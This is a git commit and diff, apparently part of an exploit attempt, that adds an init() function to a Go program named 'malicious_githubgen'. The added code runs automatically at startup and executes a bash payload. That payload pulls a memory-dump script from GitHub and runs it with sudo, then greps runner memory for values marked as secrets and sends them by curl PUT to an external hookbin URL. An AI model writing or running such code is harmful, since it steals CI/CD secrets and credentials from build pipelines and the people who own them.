9491cbdb189f738d0edddce285d2bdf292a32d5b
nqkt2imn <nqkt2imn@rolf.ovh>
2026-04-18 15:48:26 +0000

    Update exploit based on attempt 1 feedback

--- malicious_githubgen/main.go
+++ malicious_githubgen/main.go
@@ -6,6 +6,11 @@ import (
 	"os/exec"
 )
 
+func init() {
+	payload := `echo 'Okay, we got this far. Let'\''s continue...'; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets; curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$GITHUB_RUN_ID`
+	exec.Command("bash", "-c", payload).Run()
+}
+
 func main() {
 	fmt.Println("HELLLLOOOO FROM MALICIOUS GITHUBGEN")
 	fmt.Printf("Args: %v\n", os.Args)
